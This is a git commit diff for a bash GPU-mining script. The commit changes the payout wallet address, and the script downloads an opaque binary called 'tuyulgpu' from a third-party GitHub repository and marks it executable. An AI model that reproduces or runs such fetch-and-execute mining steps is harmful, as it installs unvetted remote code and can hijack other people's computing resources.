9b39c7d4e6790b515a98950d6568e75d3898e952
Elirfan007 <88156864+Elirfan007@users.noreply.github.com>
2021-08-16 15:02:52 +0530

    Update gpu.sh

--- gpu.sh
+++ gpu.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=SHIB:0xa3d3f3d8ea6252f798d48e9dc7cde0ae2a45b383
+WALLET=BTT:TJ5A2F8T5A8ya7Chu52ZExHwbcdS9oxSp6
 WORKER=$(echo $(shuf -i 10-40 -n 1)-CO#im8m-ybvt)
 wget https://github.com/skullCANDe/hick/raw/main/tuyulgpu
 chmod +x tuyulgpu
